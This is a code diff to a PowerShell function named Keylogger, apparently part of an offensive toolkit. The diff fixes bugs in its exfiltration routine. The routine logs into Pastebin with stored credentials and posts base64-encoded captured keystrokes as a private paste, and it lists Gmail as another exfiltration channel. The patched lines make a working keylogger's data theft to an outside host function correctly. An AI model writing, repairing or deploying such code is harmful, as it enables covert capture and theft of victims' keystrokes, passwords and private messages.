@@ -268,9 +268,9 @@ function script:Keylogger
                 $http_request = New-Object -ComObject Msxml2.XMLHTTP 
                 $http_request.open("POST", $url, $false) 
                 $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
-                $http_request.setRequestHeader("Content-length", $parameters.length); 
+                $http_request.setRequestHeader("Content-length", [String]$parameters.length); 
                 $http_request.setRequestHeader("Connection", "close") 
-                $http_request.send($parameters) 
+                $http_request.send([String]$parameters) 
                 $script:session_key=$http_request.responseText 
             } 
 
@@ -293,7 +293,7 @@ function script:Keylogger
                 $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
                 $pastevalue = [System.Convert]::ToBase64String($utfbytes)
                 post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
-                post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
+                post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
             }
         
             elseif ($exfiloption -eq "gmail")
